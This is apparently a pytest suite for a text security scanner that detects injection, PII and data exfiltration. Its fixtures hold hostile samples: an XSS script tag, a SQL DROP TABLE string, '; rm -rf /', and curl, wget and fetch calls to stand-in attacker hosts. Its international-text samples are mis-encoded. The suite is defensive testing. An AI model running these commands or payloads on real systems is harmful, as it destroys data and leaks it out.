"""Comprehensive tests for sentiment analysis security scanner."""

import pytest
import asyncio
from unittest.mock import patch, Mock

from src.llm_cost_tracker.sentiment_security import (
    SentimentSecurityScanner,
    SecurityThreat,
    ThreatLevel,
    ThreatType
)


@pytest.fixture
def security_scanner():
    """Create a security scanner instance for testing."""
    return SentimentSecurityScanner()


@pytest.fixture
def safe_texts():
    """Safe text samples for testing."""
    return [
        "I love this product! It's amazing.",
        "The weather is nice today.",
        "Thank you for the great service.",
        "This is a normal business message.",
        "Hello, how are you doing today?"
    ]


@pytest.fixture
def malicious_texts():
    """Malicious text samples for testing."""
    return {
        "script_injection": "<script>alert('xss')</script>",
        "js_injection": "javascript:alert(1)",
        "sql_injection": "'; DROP TABLE users; --",
        "command_injection": "; rm -rf /",
        "eval_injection": "eval(malicious_code)",
        "encoded_attack": "%3Cscript%3Ealert(1)%3C/script%3E"
    }


@pytest.fixture
def pii_texts():
    """PII containing text samples for testing."""
    return {
        "email": "Please contact me at john.doe@example.com for more info.",
        "phone": "Call me at 555-123-4567 or (555) 987-6543.",
        "ssn": "My SSN is 123-45-6789.",
        "credit_card": "My card number is 4532-1234-5678-9012.",
        "combined": "Email: alice@test.com, Phone: 555-0123, SSN: 987-65-4321"
    }


class TestSentimentSecurityScanner:
    """Test suite for SentimentSecurityScanner class."""
    
    def test_scanner_initialization(self, security_scanner):
        """Test security scanner initialization."""
        assert security_scanner.threat_patterns is not None
        assert security_scanner.pii_patterns is not None
        assert security_scanner.malicious_keywords is not None
        assert security_scanner.content_filters is not None
        
        # Check initial metrics
        assert security_scanner.total_scans == 0
        assert security_scanner.blocked_requests == 0
        assert len(security_scanner.scan_history) == 0
        
        # Check threat pattern loading
        assert ThreatType.INJECTION_ATTEMPT in security_scanner.threat_patterns
        assert ThreatType.DATA_EXFILTRATION in security_scanner.threat_patterns
        assert len(security_scanner.threat_patterns[ThreatType.INJECTION_ATTEMPT]) > 0
    
    @pytest.mark.asyncio
    async def test_safe_text_scanning(self, security_scanner, safe_texts):
        """Test scanning of safe texts."""
        for text in safe_texts:
            is_safe, threats = await security_scanner.scan_text(text, user_id="test_user")
            
            assert is_safe is True
            assert len(threats) == 0 or all(t.threat_level != ThreatLevel.CRITICAL for t in threats)
    
    @pytest.mark.asyncio
    async def test_empty_text_scanning(self, security_scanner):
        """Test scanning of empty or None text."""
        # Empty string
        is_safe, threats = await security_scanner.scan_text("", user_id="test_user")
        assert is_safe is True
        assert len(threats) == 0
        
        # None input
        is_safe, threats = await security_scanner.scan_text(None, user_id="test_user")
        assert is_safe is True
        assert len(threats) == 0
    
    @pytest.mark.asyncio
    async def test_script_injection_detection(self, security_scanner, malicious_texts):
        """Test detection of script injection attempts."""
        text = malicious_texts["script_injection"]
        is_safe, threats = await security_scanner.scan_text(text, user_id="test_user")
        
        assert is_safe is False
        assert len(threats) > 0
        
        injection_threats = [t for t in threats if t.threat_type == ThreatType.INJECTION_ATTEMPT]
        assert len(injection_threats) > 0
        assert any(t.threat_level == ThreatLevel.CRITICAL for t in injection_threats)
    
    @pytest.mark.asyncio
    async def test_javascript_injection_detection(self, security_scanner, malicious_texts):
        """Test detection of JavaScript injection attempts."""
        text = malicious_texts["js_injection"]
        is_safe, threats = await security_scanner.scan_text(text, user_id="test_user")
        
        assert is_safe is False
        assert len(threats) > 0
        
        injection_threats = [t for t in threats if t.threat_type == ThreatType.INJECTION_ATTEMPT]
        assert len(injection_threats) > 0
    
    @pytest.mark.asyncio
    async def test_sql_injection_detection(self, security_scanner, malicious_texts):
        """Test detection of SQL injection attempts."""
        text = malicious_texts["sql_injection"]
        is_safe, threats = await security_scanner.scan_text(text, user_id="test_user")
        
        assert is_safe is False
        assert len(threats) > 0
        
        # Should detect either injection attempt or malicious content
        threat_types = [t.threat_type for t in threats]
        assert (ThreatType.INJECTION_ATTEMPT in threat_types or 
                ThreatType.MALICIOUS_CONTENT in threat_types)
    
    @pytest.mark.asyncio
    async def test_command_injection_detection(self, security_scanner, malicious_texts):
        """Test detection of command injection attempts."""
        text = malicious_texts["command_injection"]
        is_safe, threats = await security_scanner.scan_text(text, user_id="test_user")
        
        assert is_safe is False
        assert len(threats) > 0
        
        # Should detect malicious keywords
        malicious_threats = [t for t in threats if t.threat_type == ThreatType.MALICIOUS_CONTENT]
        assert len(malicious_threats) > 0
    
    @pytest.mark.asyncio
    async def test_eval_injection_detection(self, security_scanner, malicious_texts):
        """Test detection of eval injection attempts."""
        text = malicious_texts["eval_injection"]
        is_safe, threats = await security_scanner.scan_text(text, user_id="test_user")
        
        assert is_safe is False
        assert len(threats) > 0
        
        malicious_threats = [t for t in threats if t.threat_type == ThreatType.MALICIOUS_CONTENT]
        assert len(malicious_threats) > 0
        assert any("eval" in t.detected_patterns for t in malicious_threats)
    
    @pytest.mark.asyncio
    async def test_encoded_content_detection(self, security_scanner, malicious_texts):
        """Test detection of encoded malicious content."""
        text = malicious_texts["encoded_attack"]
        is_safe, threats = await security_scanner.scan_text(text, user_id="test_user")
        
        # Should detect content manipulation or encoded content
        manipulation_threats = [t for t in threats if t.threat_type == ThreatType.CONTENT_MANIPULATION]
        assert len(manipulation_threats) >= 0  # May or may not be detected depending on pattern matching
    
    @pytest.mark.asyncio
    async def test_pii_detection_email(self, security_scanner, pii_texts):
        """Test detection of email addresses (PII)."""
        text = pii_texts["email"]
        is_safe, threats = await security_scanner.scan_text(text, user_id="test_user")
        
        pii_threats = [t for t in threats if t.threat_type == ThreatType.PII_EXPOSURE]
        assert len(pii_threats) > 0
        assert any(t.threat_level in [ThreatLevel.HIGH, ThreatLevel.MEDIUM] for t in pii_threats)
    
    @pytest.mark.asyncio
    async def test_pii_detection_phone(self, security_scanner, pii_texts):
        """Test detection of phone numbers (PII)."""
        text = pii_texts["phone"]
        is_safe, threats = await security_scanner.scan_text(text, user_id="test_user")
        
        pii_threats = [t for t in threats if t.threat_type == ThreatType.PII_EXPOSURE]
        assert len(pii_threats) > 0
    
    @pytest.mark.asyncio
    async def test_pii_detection_ssn(self, security_scanner, pii_texts):
        """Test detection of Social Security Numbers (PII)."""
        text = pii_texts["ssn"]
        is_safe, threats = await security_scanner.scan_text(text, user_id="test_user")
        
        pii_threats = [t for t in threats if t.threat_type == ThreatType.PII_EXPOSURE]
        assert len(pii_threats) > 0
        assert any(t.threat_level == ThreatLevel.HIGH for t in pii_threats)
    
    @pytest.mark.asyncio
    async def test_pii_detection_credit_card(self, security_scanner, pii_texts):
        """Test detection of credit card numbers (PII)."""
        text = pii_texts["credit_card"]
        is_safe, threats = await security_scanner.scan_text(text, user_id="test_user")
        
        pii_threats = [t for t in threats if t.threat_type == ThreatType.PII_EXPOSURE]
        assert len(pii_threats) > 0
    
    @pytest.mark.asyncio
    async def test_multiple_pii_detection(self, security_scanner, pii_texts):
        """Test detection of multiple PII types in single text."""
        text = pii_texts["combined"]
        is_safe, threats = await security_scanner.scan_text(text, user_id="test_user")
        
        pii_threats = [t for t in threats if t.threat_type == ThreatType.PII_EXPOSURE]
        assert len(pii_threats) > 0
        
        # Should have high risk score due to multiple PII types
        assert any(t.risk_score > 7.0 for t in pii_threats)
    
    @pytest.mark.asyncio
    async def test_content_manipulation_detection(self, security_scanner):
        """Test detection of content manipulation attempts."""
        # Control characters
        control_text = "Hello\x00\x01\x02World"
        is_safe, threats = await security_scanner.scan_text(control_text)
        
        manipulation_threats = [t for t in threats if t.threat_type == ThreatType.CONTENT_MANIPULATION]
        assert len(manipulation_threats) > 0
        
        # Excessive repetition
        repeat_text = "A" * 100
        is_safe, threats = await security_scanner.scan_text(repeat_text)
        
        manipulation_threats = [t for t in threats if t.threat_type == ThreatType.CONTENT_MANIPULATION]
        assert len(manipulation_threats) > 0
    
    @pytest.mark.asyncio
    async def test_data_exfiltration_detection(self, security_scanner):
        """Test detection of data exfiltration attempts."""
        exfiltration_texts = [
            "curl http://malicious.com/steal",
            "wget http://evil.site/data",
            "fetch('http://attacker.com/exfil')",
            "XMLHttpRequest to steal data"
        ]
        
        for text in exfiltration_texts:
            is_safe, threats = await security_scanner.scan_text(text)
            
            exfil_threats = [t for t in threats if t.threat_type == ThreatType.DATA_EXFILTRATION]
            # Some patterns might not match exactly, so check for any security threat
            assert not is_safe or len(threats) > 0
    
    @pytest.mark.asyncio
    async def test_batch_scanning(self, security_scanner, safe_texts, malicious_texts):
        """Test batch scanning functionality."""
        all_texts = safe_texts + list(malicious_texts.values())
        
        is_safe_list, threats_list = await security_scanner.scan_batch(all_texts, user_id="test_user")
        
        assert len(is_safe_list) == len(all_texts)
        assert len(threats_list) == len(all_texts)
        
        # Safe texts should generally be safe
        for i in range(len(safe_texts)):
            assert is_safe_list[i] is True or len(threats_list[i]) == 0
        
        # Malicious texts should be flagged
        for i in range(len(safe_texts), len(all_texts)):
            assert is_safe_list[i] is False or len(threats_list[i]) > 0
    
    @pytest.mark.asyncio
    async def test_batch_scanning_with_errors(self, security_scanner):
        """Test batch scanning error handling."""
        # Mix of valid and problematic inputs
        texts = ["Good text", None, "", "Another good text"]
        
        is_safe_list, threats_list = await security_scanner.scan_batch(texts)
        
        assert len(is_safe_list) == 4
        assert len(threats_list) == 4
        
        # None and empty should be handled gracefully
        assert is_safe_list[1] is True  # None
        assert is_safe_list[2] is True  # Empty string
    
    @pytest.mark.asyncio
    async def test_threat_level_assessment(self, security_scanner):
        """Test threat level assessment logic."""
        # Critical threat should block
        critical_text = "<script>alert('xss')</script>"
        is_safe, threats = await security_scanner.scan_text(critical_text)
        
        assert is_safe is False
        critical_threats = [t for t in threats if t.threat_level == ThreatLevel.CRITICAL]
        assert len(critical_threats) > 0
        
        # Multiple medium threats should potentially block
        medium_threat_text = "eval something with excessive CAPS TEXT AND encoded %3C content"
        is_safe, threats = await security_scanner.scan_text(medium_threat_text)
        
        # Risk assessment should handle multiple medium threats appropriately
        total_risk = sum(t.risk_score for t in threats)
        assert total_risk > 0
    
    @pytest.mark.asyncio
    async def test_user_context_tracking(self, security_scanner):
        """Test user context tracking in security scans."""
        user_id = "test_user_123"
        text = "Safe text for context testing"
        
        is_safe, threats = await security_scanner.scan_text(text, user_id=user_id)
        
        # Check scan history includes user context
        assert len(security_scanner.scan_history) > 0
        latest_scan = security_scanner.scan_history[-1]
        assert latest_scan["user_id"] == user_id
    
    def test_metrics_tracking(self, security_scanner):
        """Test security metrics tracking."""
        initial_metrics = security_scanner.get_security_metrics()
        
        assert "total_scans" in initial_metrics
        assert "blocked_requests" in initial_metrics
        assert "block_rate" in initial_metrics
        assert "threat_counts" in initial_metrics
        assert "recent_scan_count" in initial_metrics
        assert "avg_scan_time_ms" in initial_metrics
        
        assert initial_metrics["total_scans"] == 0
        assert initial_metrics["blocked_requests"] == 0
        assert initial_metrics["block_rate"] == 0.0
    
    @pytest.mark.asyncio
    async def test_metrics_update_after_scan(self, security_scanner, safe_texts):
        """Test metrics update after performing scans."""
        initial_metrics = security_scanner.get_security_metrics()
        
        # Perform some scans
        for text in safe_texts[:3]:
            await security_scanner.scan_text(text, user_id="test_user")
        
        updated_metrics = security_scanner.get_security_metrics()
        
        assert updated_metrics["total_scans"] > initial_metrics["total_scans"]
        assert updated_metrics["recent_scan_count"] > 0
        assert updated_metrics["avg_scan_time_ms"] >= 0
    
    @pytest.mark.asyncio
    async def test_scan_performance(self, security_scanner):
        """Test scanning performance for large texts."""
        # Large text performance test
        large_text = "This is a performance test. " * 1000  # ~25KB text
        
        start_time = time.perf_counter()
        is_safe, threats = await security_scanner.scan_text(large_text, user_id="test_user")
        scan_time = (time.perf_counter() - start_time) * 1000
        
        # Should complete scan reasonably quickly
        assert scan_time < 1000  # Less than 1 second
        assert isinstance(is_safe, bool)
        assert isinstance(threats, list)
    
    @pytest.mark.asyncio
    async def test_concurrent_scanning(self, security_scanner, safe_texts):
        """Test concurrent scanning capabilities."""
        # Create concurrent scan tasks
        tasks = [
            security_scanner.scan_text(text, user_id=f"user_{i}")
            for i, text in enumerate(safe_texts)
        ]
        
        # Execute concurrently
        results = await asyncio.gather(*tasks)
        
        assert len(results) == len(safe_texts)
        for is_safe, threats in results:
            assert isinstance(is_safe, bool)
            assert isinstance(threats, list)
    
    def test_history_cleanup(self, security_scanner):
        """Test scan history cleanup functionality."""
        # Add some fake history entries
        import time
        from datetime import datetime, timedelta
        
        # Add old entries
        old_time = (datetime.utcnow() - timedelta(hours=25)).isoformat()
        recent_time = datetime.utcnow().isoformat()
        
        security_scanner.scan_history.extend([
            {"timestamp": old_time, "test": "old"},
            {"timestamp": recent_time, "test": "recent"}
        ])
        
        # Cleanup old history (older than 24 hours)
        security_scanner.cleanup_old_history(hours=24)
        
        # Should keep recent entries, remove old ones
        remaining_entries = [h for h in security_scanner.scan_history if h.get("test")]
        assert len(remaining_entries) == 1
        assert remaining_entries[0]["test"] == "recent"
    
    @pytest.mark.asyncio
    async def test_scan_error_handling(self, security_scanner):
        """Test error handling in scan operations."""
        # Mock an internal error
        with patch.object(security_scanner, '_scan_injection_attempts', side_effect=Exception("Test error")):
            is_safe, threats = await security_scanner.scan_text("Test text", user_id="test_user")
            
            # Should fail secure (block on errors)
            assert is_safe is False
            assert len(threats) == 1
            assert threats[0].threat_type == ThreatType.MALICIOUS_CONTENT
            assert threats[0].description == "Security scan failure - blocking for safety"
    
    @pytest.mark.asyncio
    async def test_pattern_matching_edge_cases(self, security_scanner):
        """Test edge cases in pattern matching."""
        edge_cases = [
            "javascript: but not really malicious",  # Partial match
            "SELECT * FROM table",  # SQL but might be benign
            "curl command in documentation",  # Command in context
            "My email is redacted@domain.com",  # PII in normal context
            "The script tag is <script>",  # Incomplete injection
        ]
        
        for text in edge_cases:
            is_safe, threats = await security_scanner.scan_text(text, user_id="test_user")
            
            # Should handle edge cases gracefully
            assert isinstance(is_safe, bool)
            assert isinstance(threats, list)
            
            # If threats detected, should have proper structure
            for threat in threats:
                assert isinstance(threat, SecurityThreat)
                assert threat.threat_type in ThreatType
                assert threat.threat_level in ThreatLevel
                assert 0.0 <= threat.risk_score <= 10.0
    
    @pytest.mark.asyncio
    async def test_unicode_and_international_text(self, security_scanner):
        """Test handling of unicode and international text."""
        international_texts = [
            "Hola mundo, Â¿cÃ³mo estÃ¡s?",  # Spanish
            "ã“ã‚“ã«ã¡ã¯ä¸–ç•Œ",  # Japanese
            "Ð—Ð´Ñ€Ð°Ð²ÑÑ‚Ð²ÑƒÐ¹ Ð¼Ð¸Ñ€",  # Russian
            "Ù…Ø±Ø­Ø¨Ø§ Ø¨Ø§Ù„Ø¹Ø§Ù„Ù…",  # Arabic
            "ðŸŒðŸŒŽðŸŒ Hello world with emojis! ðŸŽ‰",  # Emojis
            "CafÃ© naÃ¯ve rÃ©sumÃ© faÃ§ade",  # Accented characters
        ]
        
        for text in international_texts:
            is_safe, threats = await security_scanner.scan_text(text, user_id="test_user")
            
            # International text should generally be safe
            assert isinstance(is_safe, bool)
            assert isinstance(threats, list)
            
            # Should not flag normal international text as malicious
            critical_threats = [t for t in threats if t.threat_level == ThreatLevel.CRITICAL]
            assert len(critical_threats) == 0


import time